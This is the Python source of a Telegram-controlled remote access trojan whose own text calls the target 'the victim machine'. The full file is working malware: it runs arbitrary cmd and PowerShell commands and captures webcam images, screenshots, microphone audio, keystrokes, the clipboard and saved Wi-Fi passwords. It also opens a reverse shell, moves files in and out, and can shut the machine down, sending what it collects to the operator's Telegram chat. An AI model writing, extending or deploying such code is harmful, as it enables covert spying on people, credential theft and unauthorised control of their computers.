import os
import subprocess
import sys
import getpass
import asyncio
import logging

# Updated imports for v20+
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.request import HTTPXRequest

import time
import flag
import pyperclip
from Modules import (
    ip_info,
    webcam_snap,
    screen_shot,
    audio_recorder,
    text_speaker,
    system_info,
    get_wifi_password,
    show_popup,
    wifi_scanner,
    open_website,
    media_player,
    keylogger,
    connect,
)

# Configuration
API_KEY = "" # Put your token here
CHAT_ID = ""   # Put your chat ID here
USERNAME = getpass.getuser()
TELEGRAM_PARSING_MODE = ParseMode.HTML


def listToString(s):
    str1 = " "
    return str1.join(s)


async def post_init(application: Application):
    """Sends a message when the bot comes online."""
    await application.bot.send_message(chat_id=CHAT_ID, text=f"☠️ {USERNAME} Connected")


async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📟 Get IP", callback_data="Get_IP")],
        [InlineKeyboardButton("📸 Get Screenshot", callback_data="get_Screenshot")],
        [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
        [InlineKeyboardButton("👂 Start Eavesdrop", callback_data="start_eavesdrop")],
        [InlineKeyboardButton("🛑 Stop Eavesdrop", callback_data="stop_eavesdrop")],
        [InlineKeyboardButton("⌨️ Start Keylog", callback_data="start_keylog")],
        [InlineKeyboardButton("🛑 Stop Keylog", callback_data="stop_keylog")],
        [InlineKeyboardButton("🗣️ Text To Speech on client", callback_data="speak")],
        [InlineKeyboardButton("🖥️ Get System Information", callback_data="get_system_info")],
        [InlineKeyboardButton("🔑 Perform CMD Commands", callback_data="cmd_commands")],
        [InlineKeyboardButton("🗊 Get Specific File", callback_data="get_file")],
        [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
        [InlineKeyboardButton("⚠️ Show Alert Box", callback_data="show_popup")],
        [InlineKeyboardButton("📋 Get Clipboard", callback_data="get_clipboard")],
        [InlineKeyboardButton("🗝️ Get Wifi Password", callback_data="get_wifi_password")],
        [InlineKeyboardButton("📶 Get Wi-Fi Access Points", callback_data="get_wifi_accesspoints")],
        [InlineKeyboardButton("🔌 Shut Down System", callback_data="shutdown_system")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Available Commands :", reply_markup=reply_markup)


async def speak(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        text_speaker.text_speaker(Crt_values)
        await update.message.reply_text(f"🗣️ Spoken: {Crt_values}")
    else:
        await update.message.reply_text("⚠️ Usage: /speak <text>")


async def ps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        command = listToString(inputs[1:])
        cmd_output = subprocess.Popen(
            ["powershell.exe", "-Command", command], 
            shell=False, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        output, error = cmd_output.communicate()
        
        response_text = output.decode(sys.stdout.encoding or 'utf-8', errors='replace')
        if not response_text:
            response_text = error.decode(sys.stdout.encoding or 'utf-8', errors='replace') or "Command executed with no output."

        if len(response_text) > 4000:
            response_text = response_text[:4000] + "\n...(truncated)"

        await update.message.reply_text(f"💻 Output:\n{response_text}")
    else:
        await update.message.reply_text("⚠️ Usage: /ps <command>")


async def showPopup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        show_popup.show_popup(Crt_values)
        await update.message.reply_text("⚠️ Popup shown.")
    else:
        await update.message.reply_text("⚠️ Usage: /show_popup <message>")


async def cmd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        command = listToString(inputs[1:])
        cmd_output = subprocess.Popen(
            f"cmd.exe /c {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        output, error = cmd_output.communicate()
        
        response_text = output.decode(sys.stdout.encoding or 'utf-8', errors='replace')
        if not response_text:
            response_text = error.decode(sys.stdout.encoding or 'utf-8', errors='replace') or "Command executed with no output."

        if len(response_text) > 4000:
            response_text = response_text[:4000] + "\n...(truncated)"

        await context.bot.send_message(chat_id=CHAT_ID, text=f"💻 Output:\n{response_text}")
    else:
        await update.message.reply_text("⚠️ Usage: /cmd <command>")


async def open_websites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        open_website.open_website(Crt_values)
        await update.message.reply_text(f"🌐 Opened: {Crt_values}")
    else:
        await update.message.reply_text("⚠️ Usage: /open_website <url>")


async def get_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        if os.path.exists(Crt_values):
            try:
                await context.bot.send_document(chat_id=CHAT_ID, document=open(Crt_values, "rb"))
            except Exception as e:
                await update.message.reply_text(f"❌ Error sending file: {e}")
        else:
             await update.message.reply_text("❌ File not found.")
    else:
         await update.message.reply_text("⚠️ Usage: /get_file <path>")


async def play_audio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        file_path = listToString(inputs[1:])
        result = media_player.play_audio(file_path)
        await update.message.reply_text(f"🎵 {result}")
    else:
        await update.message.reply_text("⚠️ Usage: /playaudio <path>")


async def play_video_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        file_path = listToString(inputs[1:])
        result = media_player.play_video(file_path)
        await update.message.reply_text(f"🎬 {result}")
    else:
        await update.message.reply_text("⚠️ Usage: /playvideo <path>")


async def connect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        ip = inputs[1] # Get the IP address
        msg = connect.connect_reverse_shell(ip)
        await update.message.reply_text(f"🔗 {msg}")
    else:
        await update.message.reply_text("⚠️ Usage: /connect <ip>")


async def start_keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = keylogger.start_logging()
    await update.message.reply_text(f"⌨️ {msg}")

async def stop_keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = keylogger.stop_logging()
    await update.message.reply_text(f"🛑 {msg} Sending log file...")
    if os.path.exists("keylog.txt"):
        try:
            await context.bot.send_document(
                chat_id=CHAT_ID,
                caption=USERNAME + "'s Keylogs",
                document=open("keylog.txt", "rb"),
            )
            os.remove("keylog.txt")
        except Exception as e:
                await update.message.reply_text(f"❌ Error sending log: {e}")
    else:
        await update.message.reply_text("❌ No keylog file found.")


async def upload_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles file uploads from the user to the victim machine.
    Supports Documents, Audio, Video, and Photos.
    """
    message = update.message
    if not message:
        return

    print(f"Received message with ID: {message.message_id}") # Debug log

    file_obj = None
    file_name = None

    # Determine file type and get the file object
    if message.document:
        file_obj = message.document
        file_name = file_obj.file_name
        print("Detected Document")
    elif message.audio:
        file_obj = message.audio
        file_name = file_obj.file_name or "audio.mp3"
        print("Detected Audio")
    elif message.video:
        file_obj = message.video
        file_name = file_obj.file_name or "video.mp4"
        print("Detected Video")
    elif message.photo:
        file_obj = message.photo[-1] # Get highest resolution
        file_name = f"photo_{int(time.time())}.jpg"
        print("Detected Photo")
    
    if not file_obj:
        print("No file object found in message.")
        return

    caption = message.caption
    
    # Determine destination path
    if caption:
        if os.path.isdir(caption):
            save_path = os.path.join(caption, file_name)
        elif caption.endswith(os.path.sep) or caption.endswith('/'):
             if not os.path.exists(caption):
                 try:
                     os.makedirs(caption)
                 except:
                     pass
             save_path = os.path.join(caption, file_name)
        else:
            save_path = caption
    else:
        save_path = file_name

    # Ensure save_path is absolute for clarity
    save_path = os.path.abspath(save_path)
    print(f"Saving to: {save_path}")

    try:
        new_file = await file_obj.get_file()
        await new_file.download_to_drive(custom_path=save_path)
        await update.message.reply_text(f"✅ File saved to: {save_path}")
    except Exception as e:
        print(f"Error saving file: {e}")
        await update.message.reply_text(f"❌ Error saving file: {e}")


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer() 
    result = query.data

    if result == "get_Webcam":
        webcam_snap.webcam_snap()
        if os.path.exists("webcam.jpg"):
            await context.bot.send_document(
                chat_id=CHAT_ID,
                caption=USERNAME + "'s Webcam Snap",
                document=open("webcam.jpg", "rb"),
            )
            os.remove("webcam.jpg")
        else:
            await context.bot.send_message(chat_id=CHAT_ID, text="❌ Webcam capture failed.")

    elif result == "get_system_info":
        sys_info = system_info.system_info()
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text=f"<b>-------🧰 Hardware Info-----</b>\n\n"
            f"📍 System --> {sys_info.get_system()}\n"
            f"📍 Name --> {sys_info.get_system_name()}\n"
            f"📍 Release --> {sys_info.get_system_release()}\n"
            f"📍 Version --> {sys_info.get_system_version()}\n"
            f"📍 Machine --> {sys_info.get_system_machine()}\n"
            f"📍 Processor --> {sys_info.get_system_processor()}\n\n"
            f"<b>-------📁 Memory Info-----</b>\n\n"
            f"📍 Memory Total --> {round(sys_info.mem_total)} GB\n"
            f"📍 Free Memory --> {round(sys_info.mem_free)} GB\n"
            f"📍 Used Memory --> {round(sys_info.mem_used)} GB\n\n"
            f"-------<b>💿 Hard Disk Info-----</b>\n\n"
            f"📍 Total HDD --> {round(sys_info.HDD_total)} GB\n"
            f"📍 Used HDD --> {round(sys_info.HDD_Used)} GB\n"
            f"📍 Free HDD --> {round(sys_info.HDD_Free)} GB\n",
            parse_mode=TELEGRAM_PARSING_MODE,
        )

    elif result == "Get_IP":
        ip_address_info = ip_info.ip_info()
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="⭕ <b>IP Address :</b> "
            + str(ip_address_info.get("query", "N/A"))
            + "\n⭕ <b>Country :</b> "
            + str(ip_address_info.get("country", "N/A"))
            + " "
            + flag.flag(ip_address_info.get("countryCode", "US"))
            + "\n⭕ <b> Region : </b>"
            + str(ip_address_info.get("regionName", "N/A"))
            + "\n⭕ <b>City : </b>"
            + str(ip_address_info.get("city", "N/A")),
            parse_mode=TELEGRAM_PARSING_MODE,
        )

    elif result == "get_Screenshot":
        screen_shot.screen_shot()
        if os.path.exists("Screenshot.png"):
            await context.bot.send_photo(
                chat_id=CHAT_ID,
                caption=USERNAME + "'s Screenshot",
                photo=open("Screenshot.png", "rb"),
            )
            os.remove("Screenshot.png")

    elif result == "start_eavesdrop":
        audio_recorder.start_recording()
        await context.bot.send_message(chat_id=CHAT_ID, text="👂 Started recording...")

    elif result == "stop_eavesdrop":
        audio_recorder.stop_recording()
        await context.bot.send_message(chat_id=CHAT_ID, text="🛑 Stopped recording. Sending file...")
        await asyncio.sleep(1)
        if os.path.exists("audio_record.wav"):
            await context.bot.send_audio(
                chat_id=CHAT_ID,
                caption=USERNAME + "'s Audio",
                audio=open("audio_record.wav", "rb"),
            )
            os.remove("audio_record.wav")
        else:
             await context.bot.send_message(chat_id=CHAT_ID, text="❌ Audio file not found.")

    elif result == "start_keylog":
        msg = keylogger.start_logging()
        await context.bot.send_message(chat_id=CHAT_ID, text=f"⌨️ {msg}")

    elif result == "stop_keylog":
        msg = keylogger.stop_logging()
        await context.bot.send_message(chat_id=CHAT_ID, text=f"🛑 {msg} Sending log file...")
        if os.path.exists("keylog.txt"):
            try:
                await context.bot.send_document(
                    chat_id=CHAT_ID,
                    caption=USERNAME + "'s Keylogs",
                    document=open("keylog.txt", "rb"),
                )
                # Optional: Delete after sending? User didn't specify, but usually good practice.
                # Let's keep it for now or maybe clear it on next start.
                # For safety/stealth, maybe delete.
                os.remove("keylog.txt") 
            except Exception as e:
                 await context.bot.send_message(chat_id=CHAT_ID, text=f"❌ Error sending log: {e}")
        else:
            await context.bot.send_message(chat_id=CHAT_ID, text="❌ No keylog file found.")

    elif result == "cmd_commands":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To perform commands:\nPowerShell: /ps <command>\nCMD: /cmd <command>",
        )

    elif result == "open_website":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To open website, use /open_website <website>",
        )

    elif result == "show_popup":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To show alert box, use /show_popup <message>",
        )

    elif result == "get_clipboard":
        await context.bot.send_message(
            chat_id=CHAT_ID, text=f"📋 Clipboard : \n {pyperclip.paste()}"
        )

    elif result == "get_wifi_password":
        passwords = get_wifi_password.get_wifi_password()
        wifi_pass = " \n".join(passwords) if passwords else "No passwords found."
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text=wifi_pass,
        )

    elif result == "get_wifi_accesspoints":
        access_points = wifi_scanner.wifi_scanner()
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text=f"<b>📡 Access Points from {USERNAME}:</b> \n {access_points}",
            parse_mode=TELEGRAM_PARSING_MODE,
        )

    elif result == "speak":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To speak, use /speak <text>",
        )

    elif result == "get_file":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To send file, use /get_file <file path>",
        )

    elif result == "shutdown_system":
        await context.bot.send_message(chat_id=CHAT_ID, text="🔌 Shutting down the system...")
        os.system("shutdown /s /t 0")


if __name__ == '__main__':
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # We increase the timeouts so the bot doesn't crash on slow internet
    my_request = HTTPXRequest(
        connection_pool_size=8,
        read_timeout=60.0,    
        write_timeout=60.0,   
        connect_timeout=60.0, 
        pool_timeout=60.0     
    )

    application = (
        Application.builder()
        .token(API_KEY)
        .post_init(post_init)
        .job_queue(None)   
        .request(my_request) 
        .build()
    )

    application.add_handler(CommandHandler("start", main_menu))
    application.add_handler(CommandHandler("ps", ps_command))
    application.add_handler(CommandHandler("cmd", cmd_command))
    application.add_handler(CommandHandler("speak", speak))
    application.add_handler(CommandHandler("show_popup", showPopup))
    application.add_handler(CommandHandler("open_website", open_websites))
    application.add_handler(CommandHandler("get_file", get_file))
    application.add_handler(CommandHandler("playaudio", play_audio_command))
    application.add_handler(CommandHandler("playvideo", play_video_command))
    application.add_handler(CommandHandler("connect", connect_command))
    application.add_handler(CommandHandler("startkeylog", start_keylog_command))
    application.add_handler(CommandHandler("stopkeylog", stop_keylog_command))
    application.add_handler(CommandHandler("commands", main_menu))
    
    # Handler for file uploads (Documents, Audio, Video, Photos)
    # We use a combined filter to catch all these types
    upload_filter = (
        filters.Document.ALL | 
        filters.AUDIO | 
        filters.VIDEO | 
        filters.PHOTO
    )
    application.add_handler(MessageHandler(upload_filter, upload_file_handler))

    application.add_handler(CallbackQueryHandler(button))

    print("Bot is starting... Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)
    application.run_polling()